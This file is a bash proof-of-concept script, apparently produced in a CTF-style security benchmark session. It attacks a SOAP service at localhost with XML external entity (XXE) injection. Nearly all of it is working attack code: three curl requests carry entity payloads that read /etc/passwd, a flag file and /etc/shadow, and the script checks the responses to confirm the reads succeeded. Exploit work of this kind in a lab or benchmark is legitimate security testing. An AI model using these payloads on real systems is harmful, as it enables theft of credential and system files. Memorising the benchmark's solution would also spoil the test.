#!/bin/bash
# POC: XXE Injection POC for SOAP Service - demonstrates file reading via XML external entities
# Target: ./repo
# Created: 2025-11-05T17:03:29.255Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# XXE Injection POC for SOAP Service
# Demonstrates reading /etc/passwd and flag files via XXE

TARGET="http://localhost/soap_service"
echo "[*] XXE Injection POC for SOAP Service"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Read /etc/passwd
echo "[+] Test 1: Reading /etc/passwd"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response:"
echo "$RESPONSE"
echo ""

# Check if /etc/passwd content is present in response
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[✓] SUCCESS: /etc/passwd contents found in response!"
    echo ""
else
    echo "[!] WARNING: /etc/passwd not found in response, checking for any content..."
fi

# Test 2: Read flag file
echo "[+] Test 2: Reading flag file (/home/daytona/repo/app/flag.txt)"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/daytona/repo/app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response:"
echo "$RESPONSE"
echo ""

# Check if flag is present
if echo "$RESPONSE" | grep -q "CTF{"; then
    echo "[✓] SUCCESS: Flag found in response!"
    echo ""
else
    echo "[!] WARNING: Flag not found in response"
fi

# Test 3: Try reading /etc/shadow (may fail due to permissions)
echo "[+] Test 3: Attempting to read /etc/shadow"
echo "---"
PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/xml' \
  -d "$PAYLOAD")

echo "Response:"
echo "$RESPONSE"
echo ""

echo "[*] XXE POC Complete"